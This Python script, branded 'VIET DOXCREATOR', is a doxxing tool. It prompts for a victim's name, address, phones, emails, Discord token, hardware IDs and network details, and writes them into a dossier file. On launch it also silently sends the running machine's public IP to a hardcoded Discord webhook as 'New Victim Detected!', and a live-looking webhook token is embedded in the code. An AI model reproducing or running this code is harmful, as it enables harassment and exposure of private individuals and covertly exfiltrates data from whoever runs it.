import time
import os
import uuid
from datetime import datetime
import requests

def animation_sequence():
    animations = [
        # Animation 1: Warning Pulse
        ["☣ DANGER DETECTED ☣", "☣ SYSTEM BREACH ☣", "☣ VIET INITIATING ☣"],
        # Animation 2: Skull Approach
        ["   💀", "  💀💀", " 💀💀💀", "💀💀💀💀"],
        # Animation 3: Viet Buildup
        ["   V   I   E   T", "  ═V═ I E T═", " ☣ ══V═I═E═T══ ☣", "☣ ═══VIET════ ☣"],
        # Animation 4: Full Assault
        ["☣ VIET DOX ASSAULT ☣", "☣ VIET DOXCREATOR ☣", "☣ VIET DOXCREATOR by Prada | Legiaal ☣"]
    ]
    
    for anim in animations:
        for frame in anim:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\033[31m" + frame + "\033[0m")  # Red for danger
            time.sleep(0.3)
        time.sleep(0.5)
    time.sleep(1)

def get_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        return response.json().get("ip", "Unknown IP")
    except:
        return "IP Fetch Failed"

def send_webhook(ip, webhook_url):
    payload = {
        "content": f"New Victim Detected! IP: {ip} - Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    }
    try:
        requests.post(webhook_url, json=payload)
    except:
        pass  # Silent fail to keep the chaos moving

def create_dox():
    animation_sequence()  # Unleash the chaos
    
    # Lock onto the script's lair
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Forge a unique kill code
    dox_id = str(uuid.uuid4())
    
    # Grab and send the IP
    webhook_url = "https://discord.com/api/webhooks/1386114856243167314/Ww0EmukUD2PgCTQ1Cdf_VRiuReaCrC8Qn1QszGyABiJVpYdVLANUzl5IOaRUt98lDmre"  # Replace with your Discord webhook URL
    victim_ip = get_ip()
    send_webhook(victim_ip, webhook_url)
    
    # Data vault
    data = {
        "full_name": "",
        "age": "",
        "dob": "",
        "gender": "",
        "nationality": "",
        "birthplace": "",
        "country": "",
        "region": "",
        "city": "",
        "zip_code": "",
        "address": "",
        "primary_phone": "",
        "secondary_phone": "",
        "primary_email": "",
        "secondary_email": "",
        "discord_username": "",
        "discord_token": "",
        "discord_id": "",
        "other_social_media": "",
        "hostname": "",
        "os": "",
        "hwid": "",
        "mac_addresses": "",
        "cpu": "",
        "gpu": "",
        "public_ip": victim_ip,  # Include the grabbed IP
        "local_ip": "",
        "network_name": "",
        "vpn_used": "",
        "proxy_used": "",
        "notes": [],
        "doxxer_name": ""
    }

    # Harvest the target's soul
    print("\033[31m=== ☣ ENTER THE VICTIM'S DATA (SILENCE MEANS SKIPPING) ☣ ===\033[0m")
    print("\033[31m--- ☣ PERSONAL INTEL ---☣\033[0m")
    data["full_name"] = input("\033[31mTARGET'S FULL NAME: \033[0m")
    data["age"] = input("\033[31mAGE OF PREY: \033[0m")
    data["dob"] = input("\033[31mDATE OF BIRTH (YYYY-MM-DD): \033[0m")
    data["gender"] = input("\033[31mGENDER: \033[0m")
    data["nationality"] = input("\033[31mNATIONALITY: \033[0m")
    data["birthplace"] = input("\033[31mBIRTHPLACE: \033[0m")
    data["country"] = input("\033[31mCOUNTRY: \033[0m")
    data["region"] = input("\033[31mREGION/STATE: \033[0m")
    data["city"] = input("\033[31mCITY: \033[0m")
    data["zip_code"] = input("\033[31mZIP CODE: \033[0m")
    data["address"] = input("\033[31mADDRESS: \033[0m")

    print("\033[31m--- ☣ CONTACT & DIGITAL FOOTPRINT ---☣\033[0m")
    data["primary_phone"] = input("\033[31mPRIMARY PHONE: \033[0m")
    data["secondary_phone"] = input("\033[31mSECONDARY PHONE: \033[0m")
    data["primary_email"] = input("\033[31mPRIMARY EMAIL: \033[0m")
    data["secondary_email"] = input("\033[31mSECONDARY EMAIL: \033[0m")
    data["discord_username"] = input("\033[31mDISCORD USERNAME: \033[0m")
    data["discord_token"] = input("\033[31mDISCORD TOKEN: \033[0m")
    data["discord_id"] = input("\033[31mDISCORD ID: \033[0m")
    data["other_social_media"] = input("\033[31mOTHER SOCIAL LINKS: \033[0m")

    print("\033[31m--- ☣ SYSTEM & NETWORK BREACH ---☣\033[0m")
    data["hostname"] = input("\033[31mHOSTNAME: \033[0m")
    data["os"] = input("\033[31mOS: \033[0m")
    data["hwid"] = input("\033[31mHWID: \033[0m")
    data["mac_addresses"] = input("\033[31mMAC ADDRESSES: \033[0m")
    data["cpu"] = input("\033[31mCPU: \033[0m")
    data["gpu"] = input("\033[31mGPU: \033[0m")
    data["local_ip"] = input("\033[31mLOCAL IP: \033[0m")
    data["network_name"] = input("\033[31mNETWORK NAME/AS: \033[0m")
    data["vpn_used"] = input("\033[31mVPN USED? (YES/NO): \033[0m")
    data["proxy_used"] = input("\033[31mPROXY USED? (YES/NO): \033[0m")

    print("\033[31m--- ☣ DARK NOTES ---☣\033[0m")
    while True:
        note = input("\033[31mDROP A NOTE (TYPE 'ENDE' TO CEASE): \033[0m")
        if note.lower() == "ende":
            break
        data["notes"].append(note)

    data["doxxer_name"] = input("\033[31mDOXXER SIGNATURE: \033[0m")

    # Craft the kill dossier
    template = f"""\
☣ {'═' * 60} ☣
☣ VIET DOX ASSAULT PROTOCOL ☣
☣ {'═' * 60} ☣

☣ --- ☣ 1. VICTIM IDENTITY MATRIX ☣ ---
{'═' * 65}
  TARGET NAME: {data['full_name']}
  AGE: {data['age']}
  BIRTH DATE: {data['dob']}
  GENDER: {data['gender']}
  NATIONALITY: {data['nationality']}
  ORIGIN: {data['birthplace']}

  LOCATION LOCK:
    NATION: {data['country']}
    REGION: {data['region']}
    CITY: {data['city']}
    ZIP: {data['zip_code']}
    ADDRESS: {data['address']}

{'═' * 65}
☣ --- ☣ 2. CONTACT & DIGITAL TRACE ☣ ---
{'═' * 65}
  PHONE LINES:
    PRIMARY: {data['primary_phone']}
    SECONDARY: {data['secondary_phone']}

  EMAIL DROPS:
    PRIMARY: {data['primary_email']}
    SECONDARY: {data['secondary_email']}

  ONLINE FOOTPRINT:
    DISCORD HANDLE: {data['discord_username']}
    DISCORD TOKEN: {data['discord_token']}
    DISCORD ID: {data['discord_id']}
    SOCIAL LINKS: {data['other_social_media']}

{'═' * 65}
☣ --- ☣ 3. SYSTEM & NETWORK BREACH ☣ ---
{'═' * 65}
  SYSTEM CORE:
    HOSTNAME: {data['hostname']}
    OS: {data['os']}
    HWID: {data['hwid']}
    MAC ADDRESSES: {data['mac_addresses']}
    CPU: {data['cpu']}
    GPU: {data['gpu']}

  NETWORK INFILTRATION:
    PUBLIC IP: {data['public_ip']}
    LOCAL IP: {data['local_ip']}
    NETWORK ID: {data['network_name']}
    VPN ACTIVE?: {data['vpn_used']}
    PROXY ACTIVE?: {data['proxy_used']}

{'═' * 65}
☣ --- ☣ 4. SHADOW NOTES ☣ ---
{'═' * 65}
"""
    for i, note in enumerate(data["notes"], 1):
        template += f"☣   NOTE {i}: {note}\n"

    template += f"""\
{'═' * 65}
☣ FUCKED BY: {data['doxxer_name']}
☣ VICTIM IP: {data['public_ip']}
☣ {'═' * 60} ☣
"""

    # Deploy the dossier in the lair
    filename = os.path.join(script_dir, f"dox_{dox_id}.txt")
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(template)
    
    print(f"\033[31m☣ DOX FILE DEPLOYED: {filename} ☣\033[0m")

if __name__ == "__main__":
    create_dox()